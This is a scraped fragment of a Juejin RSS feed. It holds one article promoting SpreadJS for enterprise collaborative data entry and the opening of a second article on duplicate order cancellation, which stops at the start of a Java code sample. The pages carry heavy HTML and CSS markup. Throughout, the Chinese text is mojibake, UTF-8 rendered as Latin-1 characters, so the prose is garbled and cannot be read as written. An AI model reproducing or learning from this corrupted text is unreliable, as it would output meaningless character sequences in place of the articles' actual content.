itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŸºäºSpreadJSçš„ååŒå¡«æŠ¥åº”ç”¨ | è‘¡è„åŸæŠ€æœ¯å›¢é˜Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3227821868332765/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‘¡è„åŸæŠ€æœ¯å›¢é˜Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:54:26.000Z" title="Wed Dec 10 2025 01:54:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">åŸºäºSpreadJSçš„ååŒå¡«æŠ¥åº”ç”¨</h2>
<h3 data-id="heading-1">ååŒç”µå­è¡¨æ ¼å¸¦æ¥çš„æ•ˆç‡é©å‘½</h3>
<p>åœ¨æ•°å­—åŒ–è½¬å‹çš„æµªæ½®ä¸­ï¼Œä¼ä¸šå¯¹é«˜æ•ˆåä½œå’Œæ•°æ®å¤„ç†çš„éœ€æ±‚æ—¥ç›Šå¢é•¿ã€‚ä»¥ Microsoft 365ã€é£ä¹¦å¤šç»´è¡¨æ ¼ç­‰ä¸ºä»£è¡¨çš„ååŒç”µå­è¡¨æ ¼å·¥å…·ï¼Œå‡­å€Ÿå…¶å®æ—¶ç¼–è¾‘ã€å¤šæ–¹å…±äº«çš„ç‰¹æ€§ï¼Œæå¤§åœ°é©æ–°äº†ä¼ ç»ŸåŸºäºæœ¬åœ°Excelåˆ†äº«çš„å·¥ä½œæ¨¡å¼ã€‚</p>
<p>ååŒç”µå­è¡¨æ ¼çš„æ™®åŠï¼Œæ˜¾è‘—æå‡äº†æ—¥å¸¸åŠå…¬çš„æ•ˆç‡ï¼Œå®ƒæˆåŠŸè§£å†³äº†ä»¥ä¸‹å…³é”®é—®é¢˜ï¼š</p>
<ul>
<li>æ–‡ä»¶ç‰ˆæœ¬æ··ä¹±é—®é¢˜ï¼š å½»åº•å‘Šåˆ«â€œæœ€ç»ˆç‰ˆ-æœ€ç»ˆç‰ˆ-æœ€ç»ˆç‰ˆ-v2â€çš„å›°å¢ƒï¼Œä¿è¯æ‰€æœ‰å‚ä¸è€…å§‹ç»ˆåœ¨åŒä¸€ä¸ªæœ€æ–°çš„æ–‡æ¡£ä¸Šå·¥ä½œã€‚</li>
<li>æ•°æ®å­¤å²›ä¸ä¼ è¾“å»¶è¿Ÿï¼š å®ç°äº†æ•°æ®çš„é›†ä¸­ç®¡ç†å’Œå®æ—¶åŒæ­¥ï¼Œä»è€Œæ— éœ€é€šè¿‡é‚®ä»¶æˆ–å³æ—¶é€šè®¯å·¥å…·åå¤å‘é€æ–‡ä»¶ï¼Œæœ‰æ•ˆåŠ å¿«äº†ä¸šåŠ¡æµè½¬é€Ÿåº¦ã€‚</li>
<li>åŸºç¡€åä½œé—¨æ§›é«˜ï¼š æä¾›äº†åœ¨çº¿è¯„è®ºã€æƒé™ç®¡ç†ç­‰åŠŸèƒ½ï¼Œè®©å›¢é˜Ÿåä½œæ›´åŠ ä¾¿æ·å’Œé€æ˜ã€‚</li>
</ul>
<h3 data-id="heading-2">ä¼ ç»ŸååŒç”µå­è¡¨æ ¼åœ¨ä¼ä¸šçº§å¡«æŠ¥åœºæ™¯çš„å±€é™æ€§</h3>
<p>å°½ç®¡ä¸»æµååŒç”µå­è¡¨æ ¼åœ¨é€šç”¨åä½œæ–¹é¢è¡¨ç°å‡ºè‰²ï¼Œä½†åœ¨ä¼ä¸šçº§æ•°æ®å¡«æŠ¥è¿™ä¸€æ ¸å¿ƒåœºæ™¯ä¸­ï¼Œå…¶å±€é™æ€§ä¹Ÿæ—¥ç›Šå‡¸æ˜¾ï¼š</p>
<ol>
<li><strong>æ•°æ®å®‰å…¨ä¸ç§æœ‰åŒ–æŒ‘æˆ˜</strong>ï¼š å¤§å¤šé‡‡ç”¨SaaSæ¨¡å¼ï¼Œéš¾ä»¥æ»¡è¶³é‡‘èã€æ”¿åºœç­‰è¡Œä¸šå¯¹æ ¸å¿ƒä¸šåŠ¡æ•°æ®è¿›è¡Œç§æœ‰åŒ–éƒ¨ç½²å’Œä¿è¯ä¸¥æ ¼å®‰å…¨åˆè§„çš„è¦æ±‚ã€‚</li>
<li><strong>ç³»ç»Ÿé›†æˆåº¦ä½</strong>ï¼š ç¼ºä¹ä½œä¸ºåº•å±‚ç»„ä»¶åµŒå…¥ä¼ä¸šç°æœ‰ ERPã€OA ç­‰ä¸šåŠ¡ç³»ç»Ÿçš„èƒ½åŠ›ï¼Œå¯¼è‡´æ•°æ®åœ¨åº”ç”¨é—´å½¢æˆâ€œæ•°æ®çƒŸå›±â€ã€‚</li>
<li><strong>é«˜æ˜‚çš„éƒ¨ç½²æˆæœ¬</strong>ï¼š å•†ä¸šååŒå·¥å…·çš„ç§æœ‰åŒ–ç‰ˆæœ¬é€šå¸¸è´¹ç”¨é«˜æ˜‚ï¼Œä¸”å®šåˆ¶åŒ–éš¾åº¦å¤§ï¼Œç»´æŠ¤æˆæœ¬é«˜ã€‚</li>
<li><strong>æ•°æ®äº¤äº’å—é™</strong>ï¼š éš¾ä»¥çµæ´»åœ°è¿›è¡Œç»“æ„åŒ–æ•°æ®çš„æå–å’Œå›å†™ï¼Œé˜»ç¢äº†è¡¨æ ¼æ•°æ®ä¸ä¼ä¸šæ•°æ®åº“ä¹‹é—´çš„æ— ç¼è¿æ¥ã€‚</li>
</ol>
<h3 data-id="heading-3">SpreadJS ååŒæ’ä»¶ï¼šä¸“ä¸ºä¼ä¸šçº§ååŒå¡«æŠ¥è®¾è®¡çš„è§£å†³æ–¹æ¡ˆ</h3>
<p>SpreadJSçš„ååŒèƒ½åŠ›å¹¶éç®€å•çš„â€œé»‘ç›’â€åŠŸèƒ½ï¼Œè€Œæ˜¯é‡‡ç”¨äº†å¤šå±‚ã€è§£è€¦çš„ä¸­é—´ä»¶æ¶æ„ã€‚è¿™ç§æ¶æ„è®¾è®¡èµ‹äºˆäº†ä¼ä¸šæé«˜çš„éƒ¨ç½²çµæ´»æ€§å’Œå®šåˆ¶åŒ–ç©ºé—´ã€‚</p>
<ul>
<li>çµæ´»çš„ç§æœ‰åŒ–éƒ¨ç½²æ–¹å¼ï¼Œå¯é€‰æ‹©å°†ååŒæœåŠ¡å’Œä¸šåŠ¡ç³»ç»Ÿå…±åŒéƒ¨ç½²ï¼Œä¹Ÿå¯éƒ¨ç½²ç‹¬ç«‹çš„å¾®æœåŠ¡ï¼Œé€šè¿‡APIä¸ºå¤šä¸ªä¸šåŠ¡ç³»ç»Ÿæä¾›å¡«æŠ¥åä½œèƒ½åŠ›ï¼Œå¹¶æ”¯æŒdockerã€è´Ÿè½½å‡è¡¡ç­‰æŠ€æœ¯ã€‚</li>
<li>å¤šå±‚æ¬¡çš„å®šåˆ¶åŒ–ç©ºé—´ï¼Œä»å‰ç«¯é¡µé¢ã€å†²çªå¤„ç†åˆ°ç”¨æˆ·é‰´æƒï¼Œæ•°æ®å­˜å‚¨ç­‰å„ä¸ªç¯èŠ‚ï¼Œå‡å¯ä»¥é€šè¿‡ä¸­é—´ä»¶çš„æ–¹å¼äºŒå¼€å¤„ç†ï¼Œä»è€Œå¼€å‘æ»¡è¶³ä¸ªæ€§åŒ–éœ€æ±‚çš„ç³»ç»Ÿã€‚</li>
</ul>
<p>ä¾‹å¦‚SpreadJSååŒæ–‡æ¡£æœåŠ¡ä¸ä»…æ”¯æŒè‡ªå®šä¹‰æ•°æ®åº“é…ç½®ï¼ŒåŒæ—¶å¯é…ç½®å¿«ç…§å­˜å–è§„åˆ™ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨useä¸­é—´ä»¶å’Œonæ³¨å†Œé’©å­è‡ªå®šä¹‰å¤„ç†é€»è¾‘æ³¨å†Œä¸­é—´ä»¶å’Œonæ³¨å†Œé’©å­è‡ªå®šä¹‰å¤„ç†é€»è¾‘ï¼Œåœ¨è‡ªå®šä¹‰é€»è¾‘ä¸­è®°å½•é¢å¤–æ—¥å¿—æˆ–è€…æ·»åŠ ä¸šåŠ¡ç›¸å…³æ“ä½œã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59e473dda7dd401b91084630c203ecc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JGh6JCE5Z-O5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936465&amp;x-signature=X0ozP0KAWjcN2zXaShvJzKbNwiI%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-4">åŸºäºâ€œæ•°æ®åŒºåŸŸç®¡ç†å™¨â€å®ç°ä¸šåŠ¡è§£è€¦</h3>
<p>åœ¨ååŒå¡«æŠ¥åœºæ™¯ä¸­ï¼Œä¸€ä¸ªæ ¸å¿ƒæŒ‘æˆ˜æ˜¯å¦‚ä½•æ—¢æ”¯æŒä¸šåŠ¡æ•°æ®çš„æŒ‰æƒé™å±•ç¤ºå¡«æŠ¥ï¼Œåˆå¯ä»¥å®ç°æ–‡æ¡£çš„å¤šäººå…±äº«ååŒæ“ä½œã€‚SpreadJSçš„æ•°æ®åŒºåŸŸç®¡ç†å™¨ï¼ˆData Range Providerï¼‰å¯ä»¥ç»“åˆååŒæ’ä»¶å…±åŒè§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<ul>
<li>ç‹¬ç«‹çš„æ•°æ®åŒºåŸŸï¼ŒSpreadJSå¯ä»¥åœ¨å®¢æˆ·ç«¯åˆ›å»ºå®¢æˆ·ç‹¬äº«çš„â€œæ•°æ®åŒºåŸŸâ€ï¼Œç»“åˆä¸šåŠ¡ã€ç”¨æˆ·æƒé™å•ç‹¬å¯¹åŒºåŸŸè¿›è¡Œé…ç½®ï¼Œå®ç°æ¯ä¸ªç”¨æˆ·æ‹¥æœ‰ä¸ªæ€§åŒ–çš„è¡¨æ ¼ã€‚</li>
<li>ä¸šåŠ¡æ•°æ®å’Œæ–‡æ¡£åˆ†ç¦»ï¼Œé€šè¿‡æ•°æ®åŒºåŸŸæŒ‡å®šä¸šåŠ¡æ•°æ®ï¼Œä½¿è¿™äº›ä¸šåŠ¡æ•°æ®å¯ä»¥é€šè¿‡æ•°æ®åŒºåŸŸä¸ä¸šåŠ¡ç³»ç»ŸåŒæ­¥ï¼Œè€Œå…¶ä»–åŒºåŸŸå†…å®¹åˆ™æœ‰ååŒæœåŠ¡æ¥å¤„ç†</li>
<li>ä¸šåŠ¡ä¸ååŒè§£è€¦ï¼Œå¤§å¤§ç®€åŒ–äº†ç³»ç»Ÿè®¾è®¡çš„å¤æ‚åº¦ï¼Œæ— éœ€è€ƒè™‘å¦‚ä½•ä»ååŒçš„æ–‡æ¡£ä¸­æŠ½å–ä¸šåŠ¡æ•°æ®ã€‚</li>
</ul>
<p>åœ¨å¡«æŠ¥æ•°æ®åŒºåŸŸå†…ï¼Œæ¯ä¸ªå®¢æˆ·ç«¯å¯ç‹¬ç«‹æ§åˆ¶æ•°æ®åŒºåŸŸå†…çš„æ•°æ®å­˜å–æ ¡éªŒã€å•å…ƒæ ¼æ ·å¼ä»¥åŠç¼–è¾‘æƒé™ç­‰ç”µå­è¡¨æ ¼ç‰¹æ€§ï¼Œå½“æ ¡éªŒé€šè¿‡æˆ–å­˜å‚¨æˆåŠŸåï¼Œäº¤ç”±ååŒå±‚åŒæ­¥ã€‚åŒºåŸŸä»¥å¤–ç”±ååŒå±‚ç›´æ¥åŒæ­¥å…±äº«ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b65d5ebeb61341fca1d5d958ea44d2e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JGh6JCE5Z-O5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936465&amp;x-signature=mEwXh7nJns4EeV1T02Tfkvx9XOI%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-5">æ€»ç»“ï¼šä¼ä¸šçº§ååŒå¡«æŠ¥æ–°åŸºåº§</h3>
<p>åœ¨æ•°å­—åŒ–è½¬å‹æµªæ½®ä¸­ï¼Œå°½ç®¡ä¼ ç»ŸååŒç”µå­è¡¨æ ¼æå‡äº†æ—¥å¸¸åŠå…¬æ•ˆç‡ ï¼Œä½† SpreadJS é€šè¿‡ç»„ä»¶åŒ–ç‰¹æ€§ã€å¤šå±‚è§£è€¦çš„ä¸­é—´ä»¶æ¶æ„ï¼Œç‰¹åˆ«æ˜¯ç‹¬æœ‰çš„â€œæ•°æ®åŒºåŸŸç®¡ç†å™¨â€ï¼ŒæˆåŠŸå¼¥è¡¥äº†ä¸»æµå·¥å…·åœ¨ä¼ä¸šçº§åº”ç”¨ä¸­çš„å±€é™ ã€‚è¯¥æ–¹æ¡ˆæ”¯æŒçµæ´»çš„ç§æœ‰åŒ–éƒ¨ç½²ï¼Œæ»¡è¶³é‡‘èã€æ”¿åºœç­‰è¡Œä¸šå¯¹æ ¸å¿ƒä¸šåŠ¡æ•°æ®çš„ä¸¥æ ¼å®‰å…¨åˆè§„è¦æ±‚ ã€‚åŒæ—¶ï¼Œå®ƒå…è®¸ä½œä¸ºåº•å±‚ç»„ä»¶åµŒå…¥ä¼ä¸šç°æœ‰ç³»ç»Ÿï¼Œæ‰“ç ´äº†ç³»ç»Ÿé›†æˆåº¦ä½çš„æŒ‘æˆ˜ ï¼Œå¹¶å®ç°äº†ä¸šåŠ¡æ•°æ®ä¸æ–‡æ¡£å†…å®¹çš„åˆ†ç¦»ï¼Œæœ‰æ•ˆè§£å†³ä¸šåŠ¡ä¸ååŒçš„è§£è€¦é—®é¢˜ ã€‚æœ€ç»ˆï¼ŒSpreadJS ä¸ºä¼ä¸šæä¾›äº†ä¸€ä¸ªå¼ºå¤§ã€çµæ´»ä¸”å®‰å…¨çš„æ–°åŸºåº§ï¼Œèµ‹èƒ½ä¼ä¸šçº§æ•°æ®åä½œæ–°æ¨¡å¼ ã€‚</p>
<h3 data-id="heading-6">æ‰©å±•é“¾æ¥</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.grapecity.com.cn%2Fblogs%2Fwhy-exactly-do-excel-files-get-corrupted-in-depth-ooxml-underlying-principles-and-practical-repair-strategies" target="_blank" title="https://www.grapecity.com.cn/blogs/why-exactly-do-excel-files-get-corrupted-in-depth-ooxml-underlying-principles-and-practical-repair-strategies" ref="nofollow noopener noreferrer">ç¡¬æ ¸å¹²è´§ | Excel æ–‡ä»¶åˆ°åº•æ˜¯æ€ä¹ˆåæ‰çš„ï¼Ÿæ·±å…¥ OOXML åº•å±‚åŸç†è®²è§£ä¿®å¤ç­–ç•¥</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è®¢å•è¶…æ—¶å–æ¶ˆæœºåˆ¶ä¸­çš„é‡å¤å–æ¶ˆé—®é¢˜]]></title>    <link>https://juejin.cn/post/7581727073580990515</link>    <guid>https://juejin.cn/post/7581727073580990515</guid>    <pubDate>2025-12-10T00:50:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581727073580990515" data-draft-id="7579920818871615530" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è®¢å•è¶…æ—¶å–æ¶ˆæœºåˆ¶ä¸­çš„é‡å¤å–æ¶ˆé—®é¢˜"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-10T00:50:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="uup"/> <meta itemprop="url" content="https://juejin.cn/user/4378706456356627"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è®¢å•è¶…æ—¶å–æ¶ˆæœºåˆ¶ä¸­çš„é‡å¤å–æ¶ˆé—®é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4378706456356627/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    uup
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:50:51.000Z" title="Wed Dec 10 2025 00:50:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€Bug åœºæ™¯</h2>
<p>åœ¨ä¸€ä¸ªç”µå•†ç³»ç»Ÿä¸­ï¼Œè®¢å•åˆ›å»ºåè‹¥ 30 åˆ†é’Ÿæœªæ”¯ä»˜åˆ™è‡ªåŠ¨å–æ¶ˆã€‚ç³»ç»Ÿé‡‡ç”¨ä¸¤ç§æ–¹å¼å¤„ç†è¶…æ—¶è®¢å•ï¼šâ‘  å®šæ—¶ä»»åŠ¡ï¼ˆæ¯ 5 åˆ†é’Ÿæ‰«æä¸€æ¬¡æœªæ”¯ä»˜è®¢å•ï¼Œæ‰§è¡Œå–æ¶ˆé€»è¾‘ï¼‰ï¼›â‘¡ åŸºäº Redis è¿‡æœŸé”®é€šçŸ¥ï¼ˆè®¢å•åˆ›å»ºæ—¶åœ¨ Redis ä¸­è®¾ç½® 30 åˆ†é’Ÿè¿‡æœŸé”®ï¼Œè¿‡æœŸæ—¶è§¦å‘å–æ¶ˆå›è°ƒï¼‰ã€‚ä½†å®é™…è¿è¡Œä¸­å‘ç°ï¼Œéƒ¨åˆ†è®¢å•è¢«é‡å¤å–æ¶ˆï¼Œå¯¼è‡´åº“å­˜å›æ»šå¤šæ¬¡ï¼Œå‡ºç°åº“å­˜å¼‚å¸¸ã€‚</p>
<h2 data-id="heading-1">äºŒã€ä»£ç ç¤ºä¾‹</h2>
<h3 data-id="heading-2">å®šæ—¶ä»»åŠ¡å–æ¶ˆè®¢å•</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-meta">@EnableScheduling</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderTimeoutSchedule</span> {

    <span class="hljs-meta">@Autowired</span>
